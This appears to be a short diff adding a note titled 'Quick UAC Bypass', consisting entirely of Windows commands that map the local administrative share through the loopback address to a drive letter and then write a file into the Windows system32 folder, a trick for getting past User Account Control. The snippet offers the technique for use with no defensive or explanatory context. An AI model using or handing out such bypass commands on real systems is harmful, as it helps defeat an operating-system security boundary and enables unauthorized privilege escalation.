@@ -1,0 +1,5 @@
+Quick UAC Bypass
+----------------
+net use A:\\127.0.0.1\c$
+A:
+A:\Windows\system32>echo roh > roh 
